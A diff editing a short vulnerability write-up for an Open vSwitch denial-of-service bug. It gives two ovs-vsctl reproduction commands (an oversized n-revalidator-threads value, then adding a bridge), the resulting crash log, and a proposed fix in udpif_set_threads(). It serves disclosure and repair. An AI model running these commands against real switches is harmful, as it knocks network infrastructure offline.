@@ -1,15 +1,21 @@
 # OVS-Switch-Config-Bug (CVE-2026-36499)
 
-We explain how a simple wrong config can cause a denial of service since it leads to the OVS daemon being aborted.
+We explain how a simple misconfiguration can cause a denial-of-service attack by causing the OVS daemon to abort.
 
-This bug appears when a privileged user writes an arbitrarily large integer value to n-revalidator-threads in the Open_vSwitch other_config map, then creates a bridge to trigger datapath initialization.
+This bug occurs when a privileged user writes an arbitrarily large integer to n-revalidator-threads in the Open_vSwitch other_config map, and then creates a bridge to trigger datapath initialization.
+
+We tested this configuration bug on Open vSwitch v3.6.90
 
 ```
 ovs-vsctl set Open_vSwitch . other_config:n-revalidator-threads=1000
+```
+
+Then we create a new bridge:
+```
 ovs-vsctl add-br br-attack-test &
 ```
 
-The switch then crashes:
+Then, we observe that the OVS daemon crashes:
 ```
 2026-06-03T17:46:31Z|00030|ofproto_dpif_upcall|INFO|Overriding n-handler-threads to 16, setting n-revalidator-threads to 1000
 2026-06-03T17:46:31Z|00031|ofproto_dpif_upcall|INFO|Starting 1016 threads
@@ -41,3 +47,7 @@ ovs-vswitchd(+0x1e6285) [0x620d8ad88285]
 ovs-vswitchd(revalidator508): lib/seq.c:98: pthread_mutex_lock failed: Resource deadlock avoided
 Aborted
 ```
+
+This bug is related to udpif_set_threads() function in ofproto/ofproto-dpif-upcall.c
+
+This bug can be fixed by enforcing upper bounds for the number of corresponding threads inside the udpif_set_threads() function.
